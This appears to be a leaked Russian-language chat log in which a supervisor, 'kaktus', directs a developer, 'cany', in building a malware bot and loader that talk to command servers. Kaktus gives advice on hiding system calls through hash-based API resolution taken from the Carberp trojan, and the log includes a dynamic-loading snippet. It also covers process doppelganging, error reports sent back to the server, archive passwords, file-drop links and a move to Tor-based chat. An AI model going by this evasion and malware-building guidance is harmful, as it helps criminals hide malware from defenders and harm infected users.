2020-10-22 19:04:53.581909	kaktus	cany	все основные параметры из этого файла ты также должен описать в README.txt проекта, и указать какие существенные значения для рабочей сборки (Release_Nologs)
2020-10-24 13:09:38.062362	cany	kaktus	привет
2020-10-24 13:09:45.329157	kaktus	cany	привет!
2020-10-24 13:09:46.028270	cany	kaktus	ip бк не менялся?
2020-10-24 13:11:49.060263	kaktus	cany	сейчас работы ведутся, сервак пока не работает
2020-10-24 13:12:00.844239	kaktus	cany	и не заработат раньше понедельника
2020-10-24 13:12:04.567680	kaktus	cany	как появится - отпишусь
2020-10-24 13:34:32.295890	cany	kaktus	хорошо
2020-10-24 13:34:38.896273	cany	kaktus	у меня с логированием
2020-10-24 13:34:48.613146	cany	kaktus	не все заголовочные файлы
2020-10-24 13:34:58.224527	cany	kaktus	одни тянут за собой другие
2020-10-24 13:37:13.583297	kaktus	cany	какие?
2020-10-24 13:38:01.204950	cany	kaktus	console.cpp -> GetApi.h
2020-10-24 13:38:28.766209	cany	kaktus	getapi.h -> obfuscation.h
2020-10-24 13:38:36.683616	cany	kaktus	последнего у меня нет
2020-10-24 13:38:45.872191	cany	kaktus	такая зависимость должна быть?
2020-10-24 13:39:01.776734	cany	kaktus	или от нее можно избавиться?
2020-10-24 13:39:59.539576	kaktus	cany	а каких определений не хватаате?
2020-10-24 13:40:16.941403	kaktus	cany	вообще логирование не обязательно обфусцировать
2020-10-24 13:40:40.929142	kaktus	cany	попробуй отвязать console.cpp от GetApi
2020-10-24 13:41:38.886692	cany	kaktus	тогда нет указателей на следуюзие функции
2020-10-24 13:41:42.438986	cany	kaktus	pLeaveCriticalSection
2020-10-24 13:41:45.047238	cany	kaktus	pHeapFree
2020-10-24 13:41:49.869585	cany	kaktus	pCreateFileA
2020-10-24 13:42:10.030786	cany	kaktus	не понимаю почему они через указатели вызываются
2020-10-24 13:42:25.749017	cany	kaktus	вроде не проблема
2020-10-24 13:42:38.674893	cany	kaktus	они ведь в windows.h есть
2020-10-24 13:43:18.887252	kaktus	cany	с префиксом p - это макрысы из GetApi
2020-10-24 13:43:41.291389	kaktus	cany	убери p, оставь прямые вызовы LeaveCriticalSection HeapFree и тд
2020-10-24 13:44:01.523054	cany	kaktus	и получится тоже самое только без обфускации?
2020-10-24 13:44:02.188064	kaktus	cany	у тебя GetApi.h  есть?
2020-10-24 13:44:08.630608	cany	kaktus	есть
2020-10-24 13:44:12.545903	kaktus	cany	и GetApi.cpp
2020-10-24 13:44:16.811901	cany	kaktus	да
2020-10-24 13:44:39.708332	kaktus	cany	GetApi - это пример обфускации системных вызовов
2020-10-24 13:45:28.705327	kaktus	cany	тебе надо обфусцировать вызовы в основном коде, в рабочей сборке
2020-10-24 13:46:06.907460	kaktus	cany	желательно все, но в первую очередь подозрительные - работа с сетью, запуски модулей, шеллкода
2020-10-24 13:48:21.473307	kaktus	cany	обфусцировать их можно на основе поиска имени функций по хешам, без вызова GetProcAddress() - пример такого подхода в модулях GetApi, который был изучен и описан из трояна Carberp
2020-10-24 13:48:47.395576	kaktus	cany	можешь взять за основу GetApi и подгонять под себя, можешь другой какой метод использовать
2020-10-24 13:48:52.887044	cany	kaktus	да, эти пояснения у меня есть
2020-10-24 13:48:53.742491	cany	kaktus	понял
2020-10-24 13:49:19.390140	kaktus	cany	суть в том что в бинарнике модуля не должны быть открытые текстовые строки с именами функций
2020-10-24 13:50:06.422861	kaktus	cany	а отладочный лог - он для внутреннего пользования подразумевается, там полная обфускация не обязательна
2020-10-24 14:02:32.040584	cany	kaktus	писать в файл или в крнсоль?
2020-10-24 14:04:20.938389	kaktus	cany	в версии Release_logged должно писаться в файл обязательно. В консоль можно выводить дополнительно для удобства
2020-10-26 10:45:27.584989	kaktus	cany	гитом не пользуйся пока - переезд. 
когда штатно заработает - напишу отдельно
2020-10-26 11:11:58.770806	kaktus	cany	и еще - напиши свой резервный контакт в другой жабе, на случай если эта будет недоступна. Если резерва нет - то заведи аккаунт на exploit.im или другом сервере.
2020-10-26 11:12:01.116542	kaktus	cany	Мой резервный аккаунт на случай потери связи: dpigeon@exploit.im
2020-10-26 18:59:52.013544	kaktus	cany	гитом не пользуйся пока - переезд. 
когда штатно заработает - напишу отдельно
2020-10-26 18:59:52.085971	kaktus	cany	и еще - напиши свой резервный контакт в другой жабе, на случай если эта будет недоступна. Если резерва нет - то заведи аккаунт на exploit.im или другом сервере.
2020-10-26 18:59:52.086793	kaktus	cany	Мой резервный аккаунт на случай потери связи: dpigeon@exploit.im
2020-10-27 14:52:23.162640	cany	kaktus	привет
2020-10-27 14:54:53.359753	cany	kaktus	можешь подробнее про exploit.im  рассказать
2020-10-28 17:53:05.317920	cany	kaktus	привет
2020-10-28 17:53:31.639435	kaktus	cany	привет!
2020-10-28 17:56:11.921572	cany	kaktus	бк и репозиторий все еще не работают?
2020-10-28 17:56:39.454036	kaktus	cany	да, никак не поднимут
2020-10-28 17:57:05.491929	cany	kaktus	а про exploit.im  можешь рассказать?
2020-10-28 17:57:07.941192	kaktus	cany	пока работай над тем функционалом, который не касается обмена с сервером
2020-10-28 17:58:09.364110	kaktus	cany	жаббер-сервер, типа этого. Только тот не через тор
2020-10-28 17:58:21.972188	kaktus	cany	тебе надо завести резервный аккаунт на любом жабер-сервере, exploit.im привожу в пример т.к. его часто используют
2020-11-02 13:53:02.097746	kaktus	cany	[16:52:19] <kaktus> [16:37:00] <defender> другим кого знаешь, у кого есть рез жабы, пусть мне стукнут [16:37:19] <defender> сегодня будем раздавать акки новой жабы 
[16:52:22] <kaktus> polanders@exploit.im 
[16:52:29] <kaktus> это дефендер, добавься к нему в резервной жабе. Дальше связь на резервном акке пока не будет новой жабы
2020-11-02 18:19:34.988385	kaktus	cany	[16:52:19] <kaktus> [16:37:00] <defender> другим кого знаешь, у кого есть рез жабы, пусть мне стукнут [16:37:19] <defender> сегодня будем раздавать акки новой жабы 
[16:52:22] <kaktus> polanders@exploit.im 
[16:52:29] <kaktus> это дефендер, добавься к нему в резервной жабе. Дальше связь на резервном акке пока не будет новой жабы
2020-11-03 16:54:33.880385	cany	kaktus	rkN&:;M+UWNw;mqVE5JBT
2020-11-03 16:54:36.247944	cany	kaktus	Download: https://qaz.im/load/Qyet4y/8ynHbe
Delete: https://qaz.im/index.php?a=delete&q=2032113916
2020-11-03 16:57:04.535583	kaktus	cany	принял
2020-11-03 17:04:00.069063	kaktus	cany	проект не полный, нет файла солюшна
2020-11-03 17:04:05.683262	kaktus	cany	от предыдущей версии не подходит
2020-11-03 17:05:21.497779	kaktus	cany	та подошел
2020-11-03 17:09:43.467482	kaktus	cany	жду план-отчет по проекту
2020-11-03 17:09:44.621307	kaktus	cany	[12:25:18] <kaktus> 2. напиши кратко текущее состояние проекта в следующем формате: какой функционал осталось реализовать и сколько времени на это нужно (план), отметь, какой функционал еще не до конца изучен или по какому есть вопросы/сложности
2020-11-03 17:09:49.770432	kaktus	cany	нужен срочно!
2020-11-03 17:17:46.543153	cany	kaktus	принял
2020-11-03 17:17:46.629992	cany	kaktus	проект не полный, нет файла солюшна
2020-11-03 17:17:46.630332	cany	kaktus	от предыдущей версии не подходит
2020-11-03 17:17:46.702397	cany	kaktus	та подошел
2020-11-03 17:17:46.706220	cany	kaktus	жду план-отчет по проекту
2020-11-03 17:17:46.708778	cany	kaktus	[12:25:18] <kaktus> 2. напиши кратко текущее состояние проекта в следующем формате: какой функционал осталось реализовать и сколько времени на это нужно (план), отметь, какой функционал еще не до конца изучен или по какому есть вопросы/сложности
2020-11-03 17:17:46.709637	cany	kaktus	нужен срочно!
2020-11-05 07:25:59.283054	kaktus	cany	жду план-отчет по проекту
2020-11-05 07:26:01.270899	kaktus	cany	[12:25:18] <kaktus> 2. напиши кратко текущее состояние проекта в следующем формате: какой функционал осталось реализовать и сколько времени на это нужно (план), отметь, какой функционал еще не до конца изучен или по какому есть вопросы/сложности
2020-11-05 07:26:06.983854	kaktus	cany	нужен срочно!
2020-11-05 18:02:48.073108	kaktus	cany	жду план-отчет по проекту
2020-11-05 18:02:48.230320	kaktus	cany	[12:25:18] <kaktus> 2. напиши кратко текущее состояние проекта в следующем формате: какой функционал осталось реализовать и сколько времени на это нужно (план), отметь, какой функционал еще не до конца изучен или по какому есть вопросы/сложности
2020-11-05 18:02:48.231018	kaktus	cany	нужен срочно!
2020-11-05 18:03:02.834309	cany	kaktus	понял
2020-11-05 18:03:09.493229	cany	kaktus	сейчас напишу
2020-11-05 18:08:51.921015	cany	kaktus	1. Валидация сервера
2. Сброс текущей команды (1 день)
3. Обфускация (3 дня)
4. Техника запуска exe (допель, 2 дня)
2020-11-05 18:11:28.855953	kaktus	cany	модуль лоадера не начинал еще делать?
2020-11-05 18:16:35.294883	kaktus	cany	по боту большое отклонение в сроках по сравнению с предыдущим планом - с двух недель до месяца. Почему так?
2020-11-05 18:17:51.745964	cany	kaktus	еще не начинал
2020-11-05 18:18:55.461152	cany	kaktus	в первые столкнулся с техниками реализации функционала
2020-11-05 18:19:15.726577	cany	kaktus	поэтому не расчитал
2020-11-05 18:19:33.049231	cany	kaktus	с выполнением скриптов например
2020-11-05 18:19:48.543668	cany	kaktus	оказались трудности с пайпами
2020-11-05 18:19:50.481438	kaktus	cany	доппель последний вариант так не заработал, лог не проясняет что с ним не так?
2020-11-05 18:20:00.410024	cany	kaktus	которые я не мог заранее предвидеть
2020-11-05 18:20:39.012873	cany	kaktus	у меня ошибка при создании параметров среды окружения
2020-11-05 18:20:45.301697	cany	kaktus	но код продолжает выполняться
2020-11-05 18:20:58.027025	cany	kaktus	а потом падает на старте потока
2020-11-05 18:21:22.417978	kaktus	cany	[21:19:48] <asmwardest> оказались трудности с пайпами - что не получается?
2020-11-05 18:21:25.116850	kaktus	cany	или уже решил
2020-11-05 18:21:35.254399	cany	kaktus	да это уже все решил
2020-11-05 18:23:16.822594	cany	kaktus	сейчас чтобы сброс команды текущей сделать нужен бк
2020-11-05 18:25:38.814885	kaktus	cany	так прийми файл
2020-11-05 18:25:40.206473	kaktus	cany	b7dNx#bAn7dCvsn%gAbx
2020-11-05 18:25:43.466118	kaktus	cany	Download: https://qaz.im/load/GYeG4t/NTBseE
Delete: https://qaz.im/index.php?a=delete&q=1636675062
2020-11-05 18:25:50.061010	kaktus	cany	твоя задача немного меняется теперь
2020-11-05 18:26:07.230632	kaktus	cany	тот же проект с небольшими дополнениями, но нужно ускориться
2020-11-05 18:26:53.025590	kaktus	cany	тебе нужно как можно быстрее выйти на рабочую версию БК и реализовать все в соответствии с ТЗ и файлом "дополнение к ТЗ БК бета.txt" который в этом архиве
2020-11-05 18:27:18.358522	kaktus	cany	поэтому даю тебе готовые исходники лоадера рабочего
2020-11-05 18:27:31.745551	kaktus	cany	целиком
2020-11-05 18:27:49.069795	kaktus	cany	и по БД куски кода для нового функционала - телеметрия и дополнение отчета по команде getsysinfo
2020-11-05 18:28:17.276232	kaktus	cany	если какого-то кода не хватит - напиши об этом, выдам дополнительно
2020-11-05 18:29:33.516931	kaktus	cany	алгоритмом доппеля пока не занимайся
2020-11-05 18:29:53.924048	kaktus	cany	максимум пару часов на него еще, если не заработает - откладывай и ставь заглушку
2020-11-05 18:30:29.789767	kaktus	cany	поиск командных серверов и валидация есть в лоадере, адаптируй оттуда код для бота
2020-11-05 18:31:06.028895	kaktus	cany	лоадер можешь собирать как есть, можешь под себя код адаптировать постепенно. Сейчас задача собрать как можно быстрее все
2020-11-05 18:31:47.907547	kaktus	cany	но в итоге тебе код надо будет хорошо понимать свой, т.к. в дальнейшем будешь его варьировать, менять дополнять
2020-11-05 18:32:02.956545	kaktus	cany	с учетом этого определись как сделать оптимальнее будет
2020-11-05 18:35:40.892712	kaktus	cany	подтверди, что принял файл и информацию
2020-11-05 18:36:14.324348	cany	kaktus	да, я все получил
2020-11-05 18:36:19.870675	kaktus	cany	ок
2020-11-05 18:39:01.805097	kaktus	cany	сервер БК все еще не готов, процесс это тормозит конечно увы..
2020-11-05 18:44:18.267508	kaktus	cany	вообщем изучай код и задачу, прикидывай как сделать оптимальнее все
2020-11-05 18:44:59.592366	kaktus	cany	через пару дней жду от тебя план работ и оценку времени по выходу на рабочую бета-версию БК
2020-11-05 19:04:05.327189	cany	kaktus	хорошо
2020-11-08 13:15:15.063953	kaktus	cany	привет!
2020-11-11 19:48:50.626381	kaktus	cany	тест
2020-11-11 19:49:13.891159	cany	kaktus	тест
2020-11-11 20:00:52.571564	cany	kaktus	пришло?
2020-11-11 20:01:17.224522	kaktus	cany	нет(
2020-11-11 20:02:37.975538	kaktus	cany	еще раз направь без OTR, чтото глючит дико
2020-11-11 20:06:02.690454	cany	kaktus	нет(
2020-11-11 20:06:02.853089	cany	kaktus	еще раз направь без OTR, чтото глючит дико
2020-11-11 20:13:02.949759	cany	kaktus	План: 
[01:17:04] <asmwardest> 1. Обфускация (1 день)
2. Таймауты и повторные соединения с сервером (1 день)
3. Верификация, телеметрия (1 день)
4. Перепроверить всю работу с взаимодействием с сервером (оставшиеся недочеты)(2 дня)

К 16 числу бд должен быть готов
2020-11-11 20:18:49.778683	kaktus	cany	+
2020-11-11 20:19:07.342260	kaktus	cany	все упирается в сервер - он до сих пор не работает
2020-11-11 20:21:03.377059	cany	kaktus	это да
2020-11-11 20:21:36.882688	cany	kaktus	мне нужно отправлять на сервер сообщения об ошибке (не GetLastError)
2020-11-11 20:21:44.295607	cany	kaktus	?
2020-11-11 20:21:59.825191	cany	kaktus	точнее нет
2020-11-11 20:22:04.725445	cany	kaktus	их в том числе
2020-11-11 20:22:28.760588	kaktus	cany	не обязательно
2020-11-11 20:23:16.472478	kaktus	cany	для команд запуска модулей - в случае ошибки достаточно отправлять "Result=failed"
2020-11-11 20:24:47.671933	kaktus	cany	можно чуть детализировать по типу ошибки "module download error", "incorrect executable file format", "module running error"
2020-11-11 20:25:22.316936	cany	kaktus	для команд запуска модулей - в случае ошибки достаточно отправлять "Result=failed"
2020-11-11 20:25:22.465062	cany	kaktus	можно чуть детализировать по типу ошибки "module download error", "incorrect executable file format", "module running error"
2020-11-11 20:27:27.780914	kaktus	cany	[23:23:16] <kaktus> для команд запуска модулей - в случае ошибки достаточно отправлять "Result=failed" 
[23:24:47] <kaktus> можно чуть детализировать по типу ошибки "module download error", "incorrect executable file format", "module running error"
2020-11-11 20:27:31.745584	kaktus	cany	в команде закачки файла: "file not found", "file read error"
2020-11-12 17:58:29.315336	cany	kaktus	привет
2020-11-12 18:00:00.695955	kaktus	cany	привет
2020-11-12 18:00:31.771934	cany	kaktus	что делать, если в getapi.h нет некоторых функций?
2020-11-12 18:02:34.724080	kaktus	cany	добавь макросы соответствующие, хеш-функция есть можно посчитать
2020-11-12 18:02:56.857827	kaktus	cany	или загружать динамически их
2020-11-12 18:03:56.694574	kaktus	cany	Системные вызовы либо обфусцируются GetApi.h, 
либо, если в GetApi нужный вызов отсутствует или не работает (бывает),
следующим способом:

HANDLE h = pLoadLibrary(_STR("dll_name.dll"));
void* f = pGetProcAddress(h, _STR("func_name"));
2020-11-12 18:04:25.409601	kaktus	cany	[19.09.2020 20:13:42] <kaktus> второй способ - более правильный - добавить соответствующий макрос pushargEx для нужной функции
[19.09.2020 20:14:46] <kaktus> то есть надо сгенерировать хеш для нужных функций и вписать его вторым аргументом
[19.09.2020 20:15:10] <kaktus> функция вычисления хеш в GetApi.cpp есть
[19.09.2020 20:15:40] <kaktus> в идеале - отдельным скриптом перестроить весь массив макросов
2020-11-12 18:04:32.803980	cany	kaktus	понял
2020-11-12 18:08:29.318890	kaktus	cany	hvNv5ns&snCksgBs
2020-11-12 18:08:30.206510	kaktus	cany	Download: https://qaz.im/load/ZzaYDE/hD4NHH
Delete: https://qaz.im/index.php?a=delete&q=1524149832
2020-11-12 18:09:46.938956	kaktus	cany	мой сырой вариант такого скрипта
2020-11-12 18:10:08.355325	kaktus	cany	 [19.09.2020 20:27:03] <kaktus> входной GetApi.h
[19.09.2020 20:27:30] <kaktus> возможно из него надо что-то вырезать чтобы корректно сработало, точно не помню
[19.09.2020 20:28:08] <kaktus> ну и этот скрипт был под какойто один вариант ГетАпи задочен, а они разные есть
[19.09.2020 20:28:28] <kaktus> не факт что сходу к твоей подойдет
[19.09.2020 20:29:12] <kaktus> смысл там такой: считываются строки, ищутся вида #define p****
[19.09.2020 20:29:52] <kaktus> из каждой выделяем имя функции, пускаем на хеш-функцию из GetApi.cpp и результат дописываем в макрос
[19.09.2020 20:30:50] <kaktus> третий параметр -это сквозной счетчик-нумератор, он используется в общей таблице хешей
2020-11-12 18:12:18.751869	kaktus	cany	тебе учетку в новом чате не выдали еще?
2020-11-12 18:12:24.951150	cany	kaktus	нет
2020-11-12 18:13:34.003442	kaktus	cany	стукни поландерсу еще раз, он сам может долго не вспомнить
2020-11-12 18:14:02.322392	kaktus	cany	надо в новый переходить, рас здесь глючит все. Без шифрования тут вообще переписку вести не рекомендуют
2020-11-12 18:15:12.005312	cany	kaktus	он не принял заявку
2020-11-12 18:15:37.197810	cany	kaktus	polanders@exploit.im
2020-11-12 18:20:10.199119	kaktus	cany	написал ему, ждем
2020-11-12 18:39:36.290823	kaktus	cany	https://qaz.im/zaq/SKhsFb7N#RTQ9kkbY
2020-11-12 18:51:03.964359	cany	kaktus	а что это?
2020-11-12 18:51:18.070202	kaktus	cany	новый чат
2020-11-12 18:51:32.518616	kaktus	cany	через браузер и тор
2020-11-12 18:52:01.260710	kaktus	cany	пароль одноразовый при входе придумывай новый
2020-11-12 19:07:03.701081	cany	kaktus	мне тебя там добавить надо?
2020-11-12 19:09:38.793524	kaktus	cany	написал тебе там, появилось?
2020-11-16 17:18:50.572022	cany	kaktus	привет
2020-11-16 17:38:31.590878	kaktus	cany	привет, я тебе в новом рабочем чате инфу скинул. Прими там и подтверди
